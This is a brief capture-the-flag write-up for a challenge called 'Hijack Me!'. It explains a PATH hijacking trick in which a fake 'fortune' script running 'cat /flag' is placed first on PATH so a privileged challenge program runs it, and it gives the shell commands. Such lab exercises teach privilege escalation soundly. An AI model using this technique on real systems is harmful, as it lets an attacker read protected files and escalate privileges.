# Hijack Me!

`challenge/run` runs a binary called `fortune`

Make a shell script containing `cat /flag`, name it "fortune" and give it necessary permissions

Add the directory of binary to path, and run the challenge to claim the flag:

```shell
export PATH=`pwd`:$PATH
/challenge/run
```
